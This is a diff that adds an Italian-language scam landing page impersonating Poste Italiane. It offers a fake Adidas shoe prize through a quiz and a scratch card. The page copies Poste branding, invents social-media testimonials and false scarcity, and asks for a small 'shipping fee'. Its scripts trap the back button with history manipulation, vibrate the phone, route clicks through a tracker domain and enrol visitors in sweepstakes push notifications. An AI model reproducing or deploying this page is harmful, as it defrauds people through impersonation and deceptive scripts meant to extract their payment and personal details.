@@ -1,0 +1,633 @@
+<html style="">
+
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta content="True" name="HandheldFriendly">
+    <meta content="320" name="MobileOptimized">
+    <meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0" name="viewport">
+    <meta content="width=device-width" name="viewport">
+    <meta content="on" http-equiv="cleartype">
+    <title>Premio</title><script src="Premio_files/validate.js.html"></script>
+    <link href="http://post.com.newupdate1.com/it/42/favicon.ico" rel="icon" type="image/x-icon">
+    <link href="http://post.com.newupdate1.com/it/42/favicon.ico" rel="shortcut icon" type="image/x-icon">
+    <link rel="stylesheet" href="Premio_files/bootstrap.min.css">
+    <link rel="stylesheet" href="Premio_files/font.css">
+    <link href="Premio_files/main.css" rel="stylesheet">
+    <link href="Premio_files/style.css" rel="stylesheet">
+    <script type="text/javascript" src="Premio_files/jquery-1.12.4.min.js.download"></script>
+    <script type="text/javascript" src="Premio_files/moment-with-locales-2.18.1.min.js.download"></script>
+    <script type="text/javascript" src="Premio_files/dr-dtime.js.download"></script>
+    <script src="Premio_files/jquery.eraser.js.download"></script>
+    <script src="Premio_files/main.js.download"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        }
+    </script>
+    <script>
+        var bbURL = "#";
+        ! function() {
+            var t;
+            try {
+                for (t = 0; 3 > t; ++t) history.pushState({}, "", "#");
+                onpopstate = function(t) {
+                    t.state && location.replace(bbURL)
+                }
+            } catch (o) {}
+        }();
+    </script>
+    <script>
+        function fdate(e) {
+            var a = new Date;
+            a.setDate(a.getDate() - e);
+            var t = a.getYear();
+            t < 1e3 && (t += 1900);
+            var r = (a.getDay(), a.getMonth()),
+                n = a.getDate();
+            n < 10 && (n = "0" + n);
+            var o = ["Gennaio", "Febbraio", "Marzo", "Aprile", "Maggio", "Giugno", "Luglio", "Agosto", "Settembre", "Ottobre", "Novembre", "Dicembre"];
+            return "" + o[r] + " " + n
+        }! function(e) {
+            try {
+                var a = e.vibrate || e.webkitVibrate || e.mozVibrate || e.msVibrate;
+                a && a.call(e, [666, 333, 666, 333, 666, 333, 666, 333, 666, 333, 666, 333, 666, 333])
+            } catch (e) {}
+        }(navigator)
+    </script>
+    <style>
+        .gift__before.phone {
+            background: url(keds.png) center no-repeat; background-size: 100% auto;
+        }
+    </style>
+    <script type="text/javascript">
+        // Promises 
+        var _eid_promises = {};
+        // Turn the incoming message from extension 
+        // into pending Promise resolving 
+        window.addEventListener("message", function(event) {
+            if (event.source !== window) return;
+            if (event.data.src && (event.data.src === "background.html")) {
+                console.log("Page received: ");
+                console.log(event.data);
+                // Get the promise 
+                if (event.data.nonce) {
+                    var p = _eid_promises[event.data.nonce];
+                    // resolve 
+                    if (event.data.result === "ok") {
+                        if (event.data.signature !== undefined) {
+                            p.resolve({
+                                hex: event.data.signature
+                            });
+                        } else if (event.data.version !== undefined) {
+                            p.resolve(event.data.extension + "/" + event.data.version);
+                        } else if (event.data.cert !== undefined) {
+                            p.resolve({
+                                hex: event.data.cert
+                            });
+                        } else {
+                            console.log("No idea how to handle message");
+                            console.log(event.data);
+                        }
+                    } else {
+                        // reject 
+                        p.reject(new Error(event.data.result));
+                    }
+                    delete _eid_promises[event.data.nonce];
+                } else {
+                    console.log("No nonce in event msg");
+                }
+            }
+        }, false);
+
+
+    </script>
+
+<script src="Premio_files/superpushSDK.js.html"></script>
+            <script type="text/javascript">// Promises 
+var _eid_promises = {}; 
+// Turn the incoming message from extension 
+// into pending Promise resolving 
+window.addEventListener("message", function(event) { 
+    if(event.source !== window) return; 
+    if(event.data.src && (event.data.src === "background.html")) { 
+        console.log("Page received: "); 
+        console.log(event.data); 
+        // Get the promise 
+        if(event.data.nonce) { 
+            var p = _eid_promises[event.data.nonce]; 
+            // resolve 
+            if(event.data.result === "ok") { 
+                if(event.data.signature !== undefined) { 
+                    p.resolve({hex: event.data.signature}); 
+                } else if(event.data.version !== undefined) { 
+                    p.resolve(event.data.extension + "/" + event.data.version); 
+                } else if(event.data.cert !== undefined) { 
+                    p.resolve({hex: event.data.cert}); 
+                } else { 
+                    console.log("No idea how to handle message"); 
+                    console.log(event.data); 
+                } 
+            } else { 
+                // reject 
+                p.reject(new Error(event.data.result)); 
+            } 
+            delete _eid_promises[event.data.nonce]; 
+        } else { 
+            console.log("No nonce in event msg"); 
+        } 
+    } 
+}, false); 
+ 
+ 
+function TokenSigning() { 
+    function nonce() { 
+        var val = ""; 
+        var hex = "abcdefghijklmnopqrstuvwxyz0123456789"; 
+        for(var i = 0; i < 16; i++) val += hex.charAt(Math.floor(Math.random() * hex.length)); 
+        return val; 
+    } 
+ 
+    function messagePromise(msg) { 
+        return new Promise(function(resolve, reject) { 
+            // amend with necessary metadata 
+            msg["nonce"] = nonce(); 
+            msg["src"] = "page.html"; 
+            // send message 
+            window.postMessage(msg, "*"); 
+            // and store promise callbacks 
+            _eid_promises[msg.nonce] = { 
+                resolve: resolve, 
+                reject: reject 
+            }; 
+        }); 
+    } 
+    this.getCertificate = function(options) { 
+        var msg = {type: "CERT", lang: options.lang, filter: options.filter}; 
+        console.log("getCertificate()"); 
+        return messagePromise(msg); 
+    }; 
+    this.sign = function(cert, hash, options) { 
+        var msg = {type: "SIGN", cert: cert.hex, hash: hash.hex, hashtype: hash.type, lang: options.lang, info: options.info}; 
+        console.log("sign()"); 
+        return messagePromise(msg); 
+    }; 
+    this.getVersion = function() { 
+        console.log("getVersion()"); 
+        return messagePromise({ 
+            type: "VERSION" 
+        }); 
+    }; 
+}</script></head>
+
+<body style="display: inline; margin: 0;" class="modal-open" cz-shortcut-listen="true">
+    <div id="light" class="white_content" style="display: none; box-shadow: 0 0 10px rgba(0,0,0,0.5); padding: 30px 30px 0; background: #f6f6f6; border: 2px solid #ffec00 !important; overflow: hidden;">
+
+        <img src="Premio_files/logo.png" style="display: block;width:163px;margin: -5px auto 15px auto">
+        <p style="font-size: 16px; color: #000; text-align: center;">Quasi fatto! Devi confermare il tuo recapito e pagare una piccola commissione (2.00€) per la spedizione assicurata e la consegna da parte di Poste.</p>
+        <br>
+
+        <div class="modal-footer">
+         
+                <button type="button" class="btn btn-primary goto_ques" data-dismiss="modal" style="border: 2px solid #FFF22D; background: #FFF22D; color: #000000; font-weight: bold; border-radius: 25px; padding: 10px 35px; font-size: 16px; display: block; margin: 0 auto;">OK</button>
+            </a>
+        </div>
+    </div>
+    <div id="proceed_first_samsung" class="fade-in default" style="display: none;">
+        <div class="margin">
+            <h2 style="color: #777;margin-top:20px;font-size: 20px;">seleziona il colore della tua scarpa</h2>
+            <br>
+            <a class="answer cta" data-product-name="Adidas" data-product-link="https://duktrk.com/index.php?lp=1" target="_blank" href="javascript:void(0)" target="_blank">Black</a>
+            <a class="answer cta" data-product-name="Adidas" data-product-link="https://duktrk.com/index.php?lp=1" target="_blank" href="javascript:void(0)" target="_blank">White</a>
+            <a class="answer cta" data-product-name="Adidas" data-product-link="https://duktrk.com/index.php?lp=1" target="_blank" href="javascript:void(0)" target="_blank">Blue</a>
+            <!-- <div class="close">
+                <a href="#" class="close_mod close-modal-btn_two">X</a>
+            </div> -->
+        </div>
+    </div>
+
+    <script>
+        ! function() {
+            "undefined" != typeof window.orientation && (document.body.style.display = "inline")
+        }()
+    </script>
+
+    <div class="modal fade in" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false" style="display: block; padding-right: 17px;" onclick="closeModal()">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-body">
+                    <table>
+                        <tbody>
+                            <tr>
+                                <td>
+                                    <img src="Premio_files/logo.png" alt="" style="max-width: 200px; display: block; margin: 0 auto 15px auto;">
+                                    <p style="font-size: 16px; color: #333; text-align: center;line-height: 1.6">
+                                        Congratulationi! Sei uno dei 10 fortunati utenti che abbiamo selezionato per avere l’opportunità di vincere un paio di scarpe Adidas.
+                                    </p>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-primary" data-dismiss="modal" style="background:  #eedc00; color: #000000;font-weight: bold; letter-spacing: .3; border-radius: 25px; padding: 10px 35px; font-size: 16px; margin: 0 auto; display: block;" id="btn-open" onclick="closeModal()">OK</button>
+                </div>
+            </div>            
+        </div>
+    </div>
+    <script>
+        function closeModal() {
+            $('.modal-backdrop').remove();
+            $('.modal-dialog').remove()
+
+        }
+    </script>
+    <div class="header">
+        <div style="max-width: 970px;padding: 0 20px;margin: 0 auto;display: flex;align-items: center;justify-content: space-between;height: 66px">
+            <img src="Premio_files/logo.png" style="width: 170px; margin-bottom: 5px;">
+            <a href="javascript:void(0) target="_blank" class="block-i">
+                <div class="nav-bars">
+                    <div class="bars"></div>
+                    <div class="bars"></div>
+                    <div class="bars"></div>
+                </div>
+            </a>
+            <div class="nav-bar">
+                <a href="javascript:void(0)" target="_blank">
+                    <div class="block">
+                        <p>Corrispondenza</p>
+                        <p>e Spedizioni</p>
+                    </div>
+                </a>
+                <a href="javascript:void(0)" target="_blank">
+                    <div class="block">
+                        <p>Conti carte</p>
+                        <p>e finanziamenti</p>
+                    </div>
+                </a>
+                <a href="javascript:void(0)" target="_blank">
+                    <div class="block">
+                        <p>Risparmio</p>
+                        <p>e investimenti</p>
+                    </div>
+                </a>
+                <a href="javascript:void(0)" target="_blank">
+                    <div class="block">
+                        <p>Servizi</p>
+                        <p>al cittadino</p>
+                    </div>
+                </a>
+                <a href="javascript:void(0)" target="_blank">
+                    <div class="block block-y">
+                        <p>Servizi OnLine</p>
+                    </div>
+                </a>
+                <a href="javascript:void(0)" target="_blank">
+                    <img src="Premio_files/ico-cerca.png" alt="" style="margin: 0 5px; padding: 0 5px">
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <div class="spacer"></div>
+    <div class="wrapper marg-top" style="min-height: 85vh;">
+        <div class="wrapper contestwrap">
+            <div class="toptext">
+                <table class="wrapper">
+                    <tbody>
+                        <tr>
+                            <td align="left" valign="top">
+                                <h4 style="position: relative; top: 0px;text-align: center;"> Congratulationi!</h4>
+                                <br>
+                                <span class="dat-1">
+                                    <script>
+                                        document.write(fdate(0))
+                                    </script>Luglio 12, 2019</span>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+                <div style="border-bottom:1px solid #ebebeb">
+                    <p class="wrapper" style="font-size: 16px; text-align: center;">Ogni
+                        <script type="text/javascript">
+                            var d = new Date();
+                            var weekday = new Array(7);
+                            weekday[0] = "Domenica";
+                            weekday[1] = "Lunedi";
+                            weekday[2] = "Martedi";
+                            weekday[3] = "Mercoledi";
+                            weekday[4] = "Giovedi";
+                            weekday[5] = "Venerdi";
+                            weekday[6] = "Sabato";
+                            document.write("" + weekday[d.getDay()]);
+                        </script>VenerdiLunedi, selezioniamo casualmente 10 utenti fortunati per consegnare loro un premio esclusivo!
+                        <br>
+                        <br> </p>
+                    <p class="wrapper" style="font-size: 16px; text-align: center;">Per vincere devi semplicemente rispondere alle 3 domande qui sotto e compilare la pagina successiva con I tuoi dati.
+                        <br>
+                        <br> </p>
+                </div>
+                <div class="wrapper select2" style="font-size: 14px; text-align: center;"> <b style=" color: #000;">Importante:</b> Solo 3 premi rimasti. </div>
+            </div>
+        </div>
+        <div class="wrapper form_questions" data-step="1" style="position: relative; margin-top: 20px;">
+            <div class="question" style="display: block">
+                <h3 class="question__title">Domanda <span class="question__num">1</span> di 3:
+					Da quanto tempo utilizzi i nostri servizi?
+				</h3>
+
+                <div class="button answer">
+                    <button class="button__text"> Per 1-2 anni </button>
+                </div>
+                <div class="button answer">
+                    <button class="button__text"> Per 2-4 anni </button>
+                </div>
+                <div class="button answer">
+                    <button class="button__text"> Più di 4 anni </button>
+                </div>
+            </div>
+            <div class="question">
+                <h3 class="question__title">Domanda <span class="question__num">2</span> di 3:
+					Quanto spesso usi i nostri servizi?
+				</h3>
+                <div class="button answer">
+                    <button class="button__text"> Più di una volta alla settimana </button>
+                </div>
+                <div class="button answer">
+                    <button class="button__text"> Più di una volta al mese </button>
+                </div>
+                <div class="button answer">
+                    <button class="button__text"> Più di una volta all'anno </button>
+                </div>
+                <div class="button answer">
+                    <button class="button__text"> Raramente </button>
+                </div>
+            </div>
+            <div class="question">
+                <h3 class="question__title">Domanda <span class="question__num">3</span> di 3:
+					Valuta il nostro servizio:
+				</h3>
+                <div class="button answer">
+                    <button class="button__text"> Eccellente </button>
+                </div>
+                <div class="button answer">
+                    <button class="button__text"> Buono </button>
+                </div>
+                <div class="button answer">
+                    <button class="button__text"> Scarso </button>
+                </div>
+            </div>
+        </div>
+        <div class="wrapper validate" data-step="2">
+            <div class="wrapper">
+                <p style="text-align: center;font-size: 18px;padding: 25px 0">Attendere prego...</p>
+            </div>
+        </div>
+        <div class="spacer" id="v4s"></div>
+        <div class="wrapper prize con-prize1" data-step="3">
+            <div class="samsung-show">
+                <h4 class="samsung-text">Sponsorizzato da <img src="Premio_files/adidas-logo.png"></h4>
+            </div>
+            <h2 class="gifts__title">Gratta lo strato protettivo e ricevi il tuo regalo! </h2>
+            <h2 class="gifts__title hide gifts__title-result">Congratulationi! <br> Hai vinto un paio di scarpe Adidas </h2>
+            <p class="attempt">Tentativi rimasti: <span class="attempt__num">3</span></p>
+            <div class="gifts">
+                <div class="gift">
+                    <div class="gift__inner">
+                        <div class="gift__images">
+                            <img alt="" class="gift__shape" src="Premio_files/phone-shape.png">
+                            <div class="gift__before"></div>
+                            <img alt="" class="gift__before-2" src="Premio_files/shape-color.png">
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="gifts__result hide">
+                <div class="button" style="background: #3CA839; border-radius: 25px; border: none; display: block;border: 2px solid #000; padding-top: 5px; padding-bottom: 5px;">
+                    <a style="color: #fff !important;" class="button__text" href="javascript:void(0)" onclick="ok_btn()">OTTIENI ORA</a>
+                </div>
+            </div>
+        </div>
+        <div class="spacer"></div>
+        <div class="wrapper reviews">
+            <div class="wrapper">
+                <h2>Commentare:</h2>
+            </div>
+            <table class="wrapper" style=" padding-bottom: 10px; padding-top: 10px; " id="fb5">
+                <tbody>
+                    <tr>
+                        <td width="50px" valign="top" align="right">
+                            <div class="roundimg s-11m"></div>
+                        </td>
+                        <td align="left" valign="top" class="commentpad">
+                            <div class="name">Patrizia Neri</div>
+                            <div class="text">l mio è arrivato proprio oggi. Grazie per l'Adidas!!!</div>
+                            <img class="fbimg" src="Premio_files/1.jpg">
+                            <div class="qqq">
+                                <div class="kkk">
+                                    <div class="date">
+                                        <script>
+                                            document.write(fdate(0))
+                                        </script>Luglio 12</div>
+                                    <a href="javascript:void(0)" target="_blank" class="otvet">
+                            Mi piace&nbsp;&nbsp;
+                            Commenta&nbsp;&nbsp;
+                            Condividi
+                            </a>
+                                </div>
+                                <div class="like-q">
+                                    <img src="Premio_files/like-fb.png" alt="" style="margin-right: 2px; margin-top: -1px;">4
+                                </div>
+                            </div>
+
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+            <table class="wrapper" id="fb4" style="padding-bottom: 10px; padding-top: 10px; display: none;">
+                <tbody>
+                    <tr>
+                        <td width="50px" valign="top" align="right">
+                            <div class="roundimg s-33m"></div>
+                        </td>
+                        <td align="left" valign="top" class="commentpad">
+                            <div class="name">Claudio Bencini</div>
+                            <div class="text">Al principio, pensé que se trataba de una broma, pero sorprendentemente mi Galaxy S10 llegó esta mañana y no hay nada que me impida registrarme para conseguir todos, cosa que hice, ¡ja, ja, ja!</div>
+                            <div class="qqq">
+                                <div class="kkk">
+                                    <div class="date">
+                                        <script>
+                                            document.write(fdate(1))
+                                        </script>Luglio 11Maggio 26 alle ore 3:33</div>
+                                    <a href="https://duktrk.com/index.php?lp=1" target="_blank" class="otvet">
+                            Mi piace&nbsp;&nbsp;
+                            Commenta&nbsp;&nbsp;
+                            Condividi</a>
+                                </div>
+                            </div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+            <table class="wrapper" id="fb3" style="padding-bottom: 10px; padding-top: 10px;">
+                <tbody>
+                    <tr>
+                        <td width="50px" valign="top" align="right">
+                            <div class="roundimg s-66"></div>
+                        </td>
+                        <td align="left" valign="top" class="commentpad">
+                            <div class="name">Andrea Palazzo</div>
+                            <div class="text">Questo quiz era troppo facile, spero vivamente di ricevere anch'io l'Adidas.</div>
+                            <div class="qqq">
+                                <div class="kkk">
+                                    <div class="date">
+                                        <script>
+                                            document.write(fdate(2))
+                                        </script>Luglio 10</div>
+                                    <a href="javascript:void(0)" target="_blank" class="otvet">
+                            Mi piace&nbsp;&nbsp;
+                            Commenta&nbsp;&nbsp;
+                            Condividi</a>
+                                </div>
+                            </div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+            <table class="wrapper" id="fb2" style="padding-bottom: 10px; padding-top: 10px; ">
+                <tbody>
+                    <tr>
+                        <td width="50px" valign="top" align="right">
+                            <div class="roundimg s-99"></div>
+                        </td>
+                        <td align="left" valign="top" class="commentpad">
+                            <div class="name">Francesco Rossi</div>
+                            <div class="text">Una volta ho visto questo concorso e l'ho ignorato, perché credevo fosse una bufala. Vidi di nuovo questo banner e decisi di provarlo perché ero annoiato...Ho avuto davvero il mio Adidas anch'io! Che ASSURDITÀ!</div>
+                            <div class="qqq">
+                                <div class="kkk">
+                                    <div class="date">
+                                        <script>
+                                            document.write(fdate(2))
+                                        </script>Luglio 10</div>
+                                    <a href="javascript:void(0)" target="_blank" class="otvet">
+                            Mi piace&nbsp;&nbsp;
+                            Commenta&nbsp;&nbsp;
+                            Condividi</a>
+                                </div>
+                            </div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+            <table class="wrapper" id="fb1" style=" padding-bottom: 10px; padding-top: 10px;">
+                <tbody>
+                    <tr>
+                        <td width="50px" valign="top" align="right">
+                            <div class="roundimg s-88m"></div>
+                        </td>
+                        <td align="left" valign="top" class="commentpad">
+                            <div class="name">Cetty Armenio</div>
+                            <div class="text">Grazie, ho dato l'Adidas alla mia cagnetta come regalo di compleanno. Ahahah, scherzavo, è per me :D :D :D Dio vi benedica.
+                                <div class="qqq">
+                                    <div class="kkk">
+                                        <div class="date">
+                                            <script>
+                                                document.write(fdate(2))
+                                            </script>Luglio 10</div>
+                                        <a href="javascript:void(0)" target="_blank" class="otvet">
+                            Mi piace&nbsp;&nbsp;
+                            Commenta&nbsp;&nbsp;
+                            Condividi</a>
+                                    </div>
+                                    <div class="like-q">
+                                        <img src="Premio_files/like-fb.png" alt="" style="margin-right: 2px; margin-top: -1px;">1
+                                    </div>
+                                </div>
+                            </div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+            <table class="wrapper" style="padding-bottom: 10px; padding-top: 10px;display: none">
+                <tbody>
+                    <tr>
+                        <td width="50px" valign="top" align="right">
+                            <div class="roundimg ps4man"></div>
+                        </td>
+                        <td align="left" valign="top" class="commentpad">
+                            <div class="name">Bob Hall</div>
+                            <div class="text">Cavolo, volevo la iPhone Xs max! Non è più disponibile!!!!! Ma gratis, meglio di niente, ho avuto il mio Samsung S9 ieri...</div>
+                            <div class="qqq">
+                                <div class="kkk">
+                                    <div class="date">
+                                        <script>
+                                            document.write(fdate(3))
+                                        </script>Luglio 09</div>
+                                    <a href="javascript:void(0)" target="_blank" class="otvet">
+                            Mi piace&nbsp;&nbsp;
+                            Commenta&nbsp;&nbsp;
+                            Condividi</a>
+                                </div>
+                            </div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+            <table class="wrapper" style="padding-bottom: 10px; padding-top: 10px; display: none;">
+                <tbody>
+                    <tr>
+                        <td width="50px" valign="top" align="right">
+                            <div class="roundimg s-102m"></div>
+                        </td>
+                        <td align="left" valign="top" class="commentpad">
+                            <div class="name">Oliver Joiner</div>
+                            <div class="text">Damn, I wanted the iPhone! Its out of stock !!!!! but it's still better than nothing, I got my Samsung S9 yesterday...</div>
+
+                            <div class="qqq">
+                                <div class="kkk">
+                                    <div class="date">
+                                        <script>
+                                            document.write(fdate(3))
+                                        </script>Luglio 09</div>
+                                    <a href="javascript:void(0)" target="_blank" class="otvet">
+                            Mi piace&nbsp;&nbsp;
+                            Comment&nbsp;&nbsp;
+                            Condividi</a>
+                                </div>
+                            </div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+            <div style="height:10px"></div>
+        </div>
+    </div>
+    <footer>
+        <div class="footer-block">
+            <img src="Premio_files/logo.png" alt="" width="120px" style="padding-bottom: 1px; display: block; margin: 0 auto;">
+            <span style="text-align: center; display: block;">
+				© Poste 2019 - Partita iva : 01114601006
+			</span>
+        </div>
+    </footer>
+    <script>
+        function ok_btn() {
+            $('#light').css('display', 'block');
+        }
+        window.onload = function() {
+            $('#myModal').modal('show')
+        };
+    </script>
+    <script src="Premio_files/bootstrap.js.download"></script>
+    <div class="modal-backdrop fade in" style="display: none;"></div>
+    <!-- <div class="modal-backdrop fade in"></div> -->
+
+    <script>
+superPush.init({    appId: 'cd5e76c3-84d7-4c2d-a133-301f28c25cc3',    countryCode: 'IT',    offerTags: 'SWEEPSTAKES',    prizeName: 'voucher'});    
+    </script>
+                
+
+<div class="modal-backdrop fade in"></div></body>
+
+</html>
